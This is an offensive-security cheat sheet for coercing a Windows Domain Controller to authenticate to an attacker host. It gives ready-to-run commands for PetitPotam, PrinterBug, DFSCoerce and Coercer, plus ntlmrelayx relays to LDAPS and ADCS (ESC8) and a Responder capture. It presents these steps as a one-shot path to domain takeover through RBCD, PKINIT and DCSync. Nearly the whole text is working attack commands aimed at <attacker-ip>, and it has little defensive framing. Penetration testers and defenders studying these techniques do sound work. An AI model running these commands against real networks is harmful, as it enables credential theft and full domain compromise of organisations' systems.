Authentication Coercion - Cheat Sheet

Force a Windows machine (often a Domain Controller) to authenticate to a host
you control, so its machine-account NTLM auth can be captured or relayed.
Coercion is the TRIGGER that fires Responder, ntlmrelayx, and ADCS ESC8 -
without it you just sit and wait. Requires (usually) any valid domain account.
Replace the placeholders (<...>) with your own values.


Step 1 - Pick where the coerced auth should land

  - Relay it     -> point coercion at your ntlmrelayx listener
  - Capture it   -> point at Responder (then crack the machine hash - hard)
  - Unconstrained -> point at a host you own that has unconstrained delegation

The "listener" is your attacker IP (<attacker-ip>).


Step 2 - Choose a coercion method (try several - patching varies)

PetitPotam (MS-EFSRPC) - classic, often works unauthenticated on old DCs:

    impacket-petitpotam <attacker-ip> <target-ip>
    # authenticated variant:
    impacket-petitpotam -u <user> -p <password> -d <domain> <attacker-ip> <target-ip>

PrinterBug / SpoolSample (MS-RPRN) - abuses the Print Spooler service:

    impacket-printerbug <domain>/<user>:<password>@<target-ip> <attacker-ip>

DFSCoerce (MS-DFSNM) - works even when Spooler/EFSRPC are patched:

    python3 dfscoerce.py -u <user> -p <password> -d <domain> <attacker-ip> <target-ip>

Coercer - automated, fires every known method at once (best first move):

    coercer coerce -u <user> -p <password> -d <domain> \
        -l <attacker-ip> -t <target-ip>


Step 3 - Catch it on the other side

Option A - Relay (the usual goal). In another terminal, BEFORE coercing:

    impacket-ntlmrelayx -t ldaps://<dc-ip> --delegate-access -smb2support
    # or relay to ADCS web enrollment (ESC8):
    impacket-ntlmrelayx -t http://<ca-host>/certsrv/certfnsh.asp \
        -smb2support --adcs --template DomainController

Then run the Step 2 coercion. The DC$ auth hits ntlmrelayx and is relayed.

Option B - Capture with Responder (keep it running, then coerce):

    sudo responder -I <interface>

You'll get the machine-account NetNTLMv2 hash (usually not worth cracking -
relay instead).


Step 4 - What the relayed DC$ auth gets you

  - relay to LDAP/LDAPS + --delegate-access -> set RBCD -> takeover the DC
  - relay to ADCS (ESC8) -> certificate for DC$ -> PKINIT -> DCSync
  - DC$ TGT via unconstrained delegation -> DCSync


Why coercion matters (mental model)
Relay attacks need a victim to authenticate. LLMNR/Responder waits passively
for a user to mistype a share. Coercion is the ACTIVE version: you order a
specific high-value machine (the DC) to authenticate to you on demand. That is
why "PetitPotam + ntlmrelayx to ADCS" became a one-shot domain takeover.


(optional) Confirm the trigger landed - watch ntlmrelayx/Responder output for:
    [*] Authenticating against ... as <DOMAIN>\<MACHINE>$ SUCCEED


Key idea: coercion turns relay from "wait and hope" into "point and shoot."
You don't need to crack anything - you make the most privileged machine
accounts authenticate to you, then relay that authentication to a service that
grants you control (LDAP for RBCD, ADCS for a cert). Always have your catcher
(ntlmrelayx / Responder) running first, then fire the coercion.
